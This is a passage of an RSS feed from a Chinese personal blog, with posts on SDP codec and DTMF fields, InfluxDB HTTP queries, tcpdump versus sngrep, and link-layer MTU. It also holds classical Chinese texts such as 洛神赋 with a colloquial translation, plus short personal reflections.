  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;GSM/8000&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;8&lt;/td&gt;
          &lt;td&gt;PCMA/8000&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;9&lt;/td&gt;
          &lt;td&gt;G722/8000&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;18&lt;/td&gt;
          &lt;td&gt;G729/8000&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;102&lt;/td&gt;
          &lt;td&gt;DTMF/8000&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;a=rtpmap:101 telephone-event/8000&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;&lt;strong&gt;a=fmtp:101 0-16&lt;/strong&gt;&lt;!-- raw HTML omitted --&gt;上面的字段描述的是DTMP的支持。DTMF标准，所有SIP实体至少支持0-15的DTMF事件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;0-9是数字&lt;/li&gt;
&lt;li&gt;10是*&lt;/li&gt;
&lt;li&gt;11是#&lt;/li&gt;
&lt;li&gt;12-15对应A,B,C,D&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.iana.org/assignments/rtp-parameters/rtp-parameters.xhtml&#34;&gt;https://www.iana.org/assignments/rtp-parameters/rtp-parameters.xhtml&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.3cx.com/blog/voip-howto/sdp-voip2/&#34;&gt;https://www.3cx.com/blog/voip-howto/sdp-voip2/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.3cx.com/blog/voip-howto/sdp-voip/&#34;&gt;https://www.3cx.com/blog/voip-howto/sdp-voip/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>influxdb HTTP 接口学习</title>
      <link>https://wdd.js.org/posts/2019/12/pv5xgz/</link>
      <pubDate>Thu, 05 Dec 2019 11:12:33 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/12/pv5xgz/</guid>
      <description>&lt;h1 id=&#34;heading&#34;&gt;&lt;/h1&gt;
&lt;h1 id=&#34;查询某个字段&#34;&gt;查询某个字段&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; real_used_size &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; opensips &lt;span style=&#34;color:#66d9ef&#34;&gt;WHERE&lt;/span&gt;  time &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2019-12-05T00:10:00Z&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;正常查询结果，下面是例子，和上面的sql没有关系。&lt;/p&gt;
&lt;p&gt;:::warning
时间必须用单引号括起来，不能用双引号，格式也必须是YYYY-MM-DDTHH:MM:SSZ
:::&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;results&amp;#34;&lt;/span&gt;: [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;statement_id&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;series&amp;#34;&lt;/span&gt;: [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cpu_load_short&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;columns&amp;#34;&lt;/span&gt;: [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;value&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    ],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;values&amp;#34;&lt;/span&gt;: [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2015-01-29T21:55:43.702900257Z&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        ],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2015-01-29T21:55:43.702900257Z&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        ],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        [
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2015-06-11T20:46:02Z&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                            &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果有报错，数组项中的某一个会有error属性，值为报错原因&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;results&amp;#34;&lt;/span&gt;:[
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;statement_id&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;invalid operation: time and *influxql.StringLiteral are not compatible&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;批次查询&#34;&gt;批次查询&lt;/h1&gt;
&lt;p&gt;语句之间用分号隔开&lt;/p&gt;</description>
    </item>
    <item>
      <title>tcp-dump</title>
      <link>https://wdd.js.org/opensips/tools/tcp-dump/</link>
      <pubDate>Wed, 04 Dec 2019 11:08:27 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/tcp-dump/</guid>
      <description>&lt;p&gt;sngrep长时间抓包会导致内存堆积，所以sngrep只适合短时间分析抓包，长时间抓包需要用tcp-dump&lt;/p&gt;</description>
    </item>
    <item>
      <title>2 链路层</title>
      <link>https://wdd.js.org/network/xwuvyr/</link>
      <pubDate>Thu, 28 Nov 2019 13:35:34 +0800</pubDate>
      <guid>https://wdd.js.org/network/xwuvyr/</guid>
      <description>&lt;h1 id=&#34;最大传输单元mtu&#34;&gt;最大传输单元MTU&lt;/h1&gt;
&lt;p&gt;以太网和802.3对数据帧的长度有个限制，其最大长度分别是1500和1942。链路层的这个特性称作MTU,  最大传输单元。不同类型的网络大多数都有一个限制。&lt;/p&gt;
&lt;p&gt;如果IP层的数据报的长度比链路层的MTU大，那么IP层就需要分片，每一片的长度要小于MTU。&lt;/p&gt;
&lt;p&gt;使用netstat -in可以打印出网络接口的MTU&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;➜&lt;/span&gt;  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;~&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;netstat&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-in&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Kernel&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Interface&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;table&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Iface&lt;/span&gt;       &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;MTU&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Met&lt;/span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;RX-OK&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;RX-ERR&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;RX-DRP&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;RX-OVR&lt;/span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;TX-OK&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;TX-ERR&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;TX-DRP&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;TX-OVR&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Flg&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;eth2&lt;/span&gt;       &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;1500&lt;/span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;1078767768&lt;/span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;2264&lt;/span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;689&lt;/span&gt;      &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;1297577913&lt;/span&gt;      &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;BMRU&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;lo&lt;/span&gt;        &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;16436&lt;/span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;734474&lt;/span&gt;      &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;734474&lt;/span&gt;      &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt;      &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;LRU&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;路径mtu&#34;&gt;路径MTU&lt;/h1&gt;
&lt;p&gt;信息经过多个网络时，不同网络可能会有不同的MTU，而其中最小的一个MTU, 称为路径MTU。&lt;/p&gt;</description>
    </item>
    <item>
      <title>登徒子好色赋</title>
      <link>https://wdd.js.org/posts/2019/11/wkyqnl/</link>
      <pubDate>Wed, 27 Nov 2019 13:37:31 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/11/wkyqnl/</guid>
      <description>&lt;h1 id=&#34;原文&#34;&gt;原文&lt;/h1&gt;
&lt;p&gt;大夫登徒子侍于楚王，短宋玉曰：&amp;ldquo;玉为人体貌闲丽，口多微辞，又性好色。愿王勿与出入后宫。&amp;rdquo;　&lt;/p&gt;
&lt;p&gt;王以登徒子之言问宋玉。&lt;/p&gt;
&lt;p&gt;玉曰：&amp;ldquo;体貌闲丽，所受于天也；口多微辞，所学于师也；至于好色，臣无有也。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;王曰：&amp;ldquo;子不好色，亦有说乎？有说则止，无说则退。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;玉曰：&amp;ldquo;天下之佳人莫若楚国，楚国之丽者莫若臣里，臣里之美者莫若臣东家之子。东家之子，增之一分则太长，减之一分则太短 ；著粉则太白，施朱则太赤；眉如翠羽，肌如白雪；腰如束素，齿如含贝；嫣然一笑，惑阳城，迷下蔡。然此女登墙窥臣三年，至今未许也。登徒子则不然：其妻蓬头挛耳，齞唇历齿，旁行踽偻，又疥且痔。登徒子悦之，使有五子。王孰察之，谁为好色者矣。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;是时，秦章华大夫在侧，因进而称曰：&amp;ldquo;今夫宋玉盛称邻之女，以为美色，愚乱之邪；臣自以为守德，谓不如彼矣。且夫南楚穷巷之妾，焉足为大王言乎?若臣之陋，目所曾睹者，未敢云也。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;王曰：&amp;ldquo;试为寡人说之。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;大夫曰：&amp;ldquo;唯唯。臣少曾远游，周览九土，足历五都。出咸阳、熙邯郸，从容郑、卫、溱 、洧之间 。是时向春之末 ，迎夏之阳，鸧鹒喈喈，群女出桑。此郊之姝，华色含光，体美容冶，不待饰装。臣观其丽者，因称诗曰：&amp;lsquo;遵大路兮揽子祛&amp;rsquo;。赠以芳华辞甚妙。于是处子怳若有望而不来，忽若有来而不见。意密体疏，俯仰异观；含喜微笑，窃视流眄。复称诗曰：&amp;lsquo;寐春风兮发鲜荣，洁斋俟兮惠音声，赠我如此兮不如无生。&amp;lsquo;因迁延而辞避。盖徒以微辞相感动。精神相依凭；目欲其颜，心顾其义，扬《诗》守礼，终不过差，故足称也。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;于是楚王称善，宋玉遂不退。&lt;/p&gt;
&lt;h1 id=&#34;我来翻译&#34;&gt;我来翻译&lt;/h1&gt;
&lt;p&gt;士大夫登徒先生站在楚王身旁，评论宋玉，说：宋玉这小伙子，长得很帅，但是非常八卦，而且好色，建议您不要让他进入后宫。&lt;/p&gt;
&lt;p&gt;楚王用登徒先生的话问宋玉。&lt;/p&gt;
&lt;p&gt;宋玉争辩说：我长得帅，这是父母生得好。我比较八卦，是因为我学识广博，口才好。至于说我好色，那是没有的事情。&lt;/p&gt;
&lt;p&gt;宋玉接着说：“天下的美女啊，没有比得上楚国的。楚国的美女，没有比得上臣里这个地方的。臣里的美女，没有比得上我邻居家的那个姑娘。”&lt;/p&gt;
&lt;p&gt;“那个姑娘，长得再高一点就太高了，长得再低一点就太低了。擦了粉底的话就太白，擦了腮红就太红了。眉毛像黑色的羽毛，肌肤像白雪一样。腰非常细，牙齿像贝壳一样白皙。”&lt;/p&gt;
&lt;p&gt;“她一笑，阳城和下蔡这两个地方的所有男人，都会被迷住。”&lt;/p&gt;
&lt;p&gt;“然而这个美女，天天登上我家的墙头偷窥我三年了，我至今都没有答应她让她作为我女朋友。”&lt;/p&gt;
&lt;p&gt;“登徒先生则不然，他老婆蓬头垢面、兔唇龅牙、走路佝偻、还长痔疮。但是登徒先生却非常喜欢她，和她生了5个孩子。大王你仔细想想，谁才是真正的好色？”&lt;/p&gt;</description>
    </item>
    <item>
      <title>洛神赋</title>
      <link>https://wdd.js.org/posts/2019/11/ck3yzp/</link>
      <pubDate>Wed, 27 Nov 2019 13:32:53 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/11/ck3yzp/</guid>
      <description>&lt;p&gt;黄初三年，余朝京师，还济洛川。古人有言：斯水之神，名曰宓妃。感宋玉对楚王神女之事，遂作斯赋。其词曰：&lt;/p&gt;
&lt;p&gt; 余从京域，言归东藩，背伊阙，越轘辕，经通谷，陵景山。日既西倾，车殆马烦。尔乃税驾乎蘅皋，秣驷乎芝田，容与乎阳林，流眄乎洛川。于是精移神骇，忽焉思散。俯则未察，仰以殊观。睹一丽人，于岩之畔。乃援御者而告之曰：“尔有觌于彼者乎？彼何人斯，若此之艳也！”御者对曰：“臣闻河洛之神，名曰宓妃。然则君王之所见，无乃是乎！其状若何？臣愿闻之。”&lt;/p&gt;
&lt;p&gt; 余告之曰：其形也，&lt;strong&gt;翩若惊鸿，婉若游龙&lt;/strong&gt;。荣曜秋菊，华茂春松。髣髴兮若轻云之蔽月，飘飖兮若流风之回雪。远而望之，皎若太阳升朝霞；迫而察之，灼若芙蕖出渌波。秾纤得中，修短合度。肩若削成，腰如约素。延颈秀项，皓质呈露。芳泽无加，铅华弗御。云髻峨峨，修眉联娟。丹唇外朗，皓齿内鲜。明眸善睐，靥辅承权。瓌姿艳逸，仪静体闲。柔情绰态，媚于语言。奇服旷世，骨像应图。披罗衣之璀粲兮，珥瑶碧之华琚。戴金翠之首饰，缀明珠以耀躯。践远游之文履，曳雾绡之轻裾。微幽兰之芳蔼兮，步踟蹰于山隅。于是忽焉纵体，以遨以嬉。左倚采旄，右荫桂旗。攘皓腕于神浒兮，采湍濑之玄芝。&lt;/p&gt;
&lt;p&gt; 余情悦其淑美兮，心振荡而不怡。无良媒以接欢兮，托微波而通辞。愿诚素之先达兮，解玉佩以要之。嗟佳人之信修，羌习礼而明诗。抗琼珶以和予兮，指潜渊而为期。执眷眷之款实兮，惧斯灵之我欺。感交甫之弃言兮，怅犹豫而狐疑。收和颜而静志兮，申礼防以自持。&lt;/p&gt;
&lt;p&gt; 于是洛灵感焉，徙倚彷徨。神光离合，乍阴乍阳。竦轻躯以鹤立，若将飞而未翔。践椒途之郁烈，步蘅薄而流芳。超长吟以永慕兮，声哀厉而弥长。尔乃众灵杂沓，命俦啸侣。或戏清流，或翔神渚，或采明珠，或拾翠羽。从南湘之二妃，携汉滨之游女。叹匏瓜之无匹兮，咏牵牛之独处。扬轻袿之猗靡兮，翳修袖以延伫。体迅飞凫，飘忽若神。**凌波微步，罗袜生尘。**动无常则，若危若安；进止难期，若往若还。转眄流精，光润玉颜。含辞未吐，气若幽兰。华容婀娜，令我忘餐。&lt;/p&gt;
&lt;p&gt; 于是屏翳收风，川后静波。冯夷鸣鼓，女娲清歌。腾文鱼以警乘，鸣玉銮以偕逝。六龙俨其齐首，载云车之容裔。鲸鲵踊而夹毂，水禽翔而为卫。于是越北沚，过南冈，纡素领，回清扬。动朱唇以徐言，陈交接之大纲。恨人神之道殊兮，怨盛年之莫当。抗罗袂以掩涕兮，泪流襟之浪浪。悼良会之永绝兮，哀一逝而异乡。无微情以效爱兮，献江南之明珰。虽潜处于太阴，长寄心于君王。忽不悟其所舍，怅神宵而蔽光。&lt;/p&gt;
&lt;p&gt; 于是背下陵高，足往神留。遗情想像，顾望怀愁。冀灵体之复形，御轻舟而上溯。浮长川而忘反，思绵绵而增慕。夜耿耿而不寐，沾繁霜而至曙。命仆夫而就驾，吾将归乎东路。揽騑辔以抗策，怅盘桓而不能去。&lt;/p&gt;</description>
    </item>
    <item>
      <title>割韭菜</title>
      <link>https://wdd.js.org/posts/2019/11/blqt1k/</link>
      <pubDate>Wed, 27 Nov 2019 13:29:16 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/11/blqt1k/</guid>
      <description>&lt;p&gt;有两种选择，要么被忽悠成韭菜被别人割，要么割别热的韭菜。&lt;/p&gt;</description>
    </item>
    <item>
      <title>朝三暮四</title>
      <link>https://wdd.js.org/posts/2019/11/urkvnz/</link>
      <pubDate>Wed, 27 Nov 2019 13:19:07 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/11/urkvnz/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;“狙公赋芧，曰：&amp;lsquo;朝三而暮四。&amp;lsquo;众狙皆怒。曰：&amp;lsquo;然则朝四而暮三。&amp;lsquo;众狙皆悦。名实未亏而喜怒为用，亦因是也。《庄子—齐物论》&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;有个人养猴子，每天早上喂给每个猴子三颗枣，下午每个猴子喂四颗枣。&lt;/p&gt;
&lt;p&gt;有一天他突然想搞点事情，就对猴子说：从今以后，每天早上每人给你们四颗枣，下午每人给你们三颗枣，你们说好不好？&lt;/p&gt;
&lt;p&gt;猴子们上蹿下跳，怒发冲冠，生气的说：不行！不行！那怎么行呢？&lt;/p&gt;
&lt;p&gt;养猴子人摆摆手，和气的说：好吧，好吧，还按照以前方式来。&lt;/p&gt;
&lt;p&gt;猴子们很满意，笼子里充满祥和的空气~&lt;/p&gt;</description>
    </item>
    <item>
      <title>众生鱼肉</title>
      <link>https://wdd.js.org/posts/2019/11/kug5fo/</link>
      <pubDate>Wed, 27 Nov 2019 13:17:10 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/11/kug5fo/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;冷风如刀，以大地为砧板，视众生为鱼肉。万里飞雪，将苍穹作洪炉，溶万物为白银
《多情剑客无情剑》&lt;/p&gt;&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>第三种生存</title>
      <link>https://wdd.js.org/posts/2019/11/gn4aak/</link>
      <pubDate>Wed, 27 Nov 2019 13:02:14 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/11/gn4aak/</guid>
      <description>&lt;p&gt;我以前看过王志刚的一本书《第三种生存》，觉得蛮有意思的。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;依赖于权利阶层。例如当官&lt;/li&gt;
&lt;li&gt;依赖于财富阶层。例如打工&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;大部分人其实都在依赖权利阶层或者财富阶层在生存，能够跳出的人这两种生存方式的，称之为第三种生存。&lt;/p&gt;
&lt;p&gt;第三种生存方式，是讲自己打造成某个领域中专家级别的人物。&lt;/p&gt;
&lt;p&gt;称为专家，称为大多数中的少数人。物以稀为贵，人亦如此。&lt;/p&gt;</description>
    </item>
    <item>
      <title>1 概述</title>
      <link>https://wdd.js.org/network/ir1i82/</link>
      <pubDate>Wed, 27 Nov 2019 09:20:48 +0800</pubDate>
      <guid>https://wdd.js.org/network/ir1i82/</guid>
      <description>&lt;h1 id=&#34;分层&#34;&gt;分层&lt;/h1&gt;
&lt;p&gt;应用程序一般处理应用层的&lt;/p&gt;
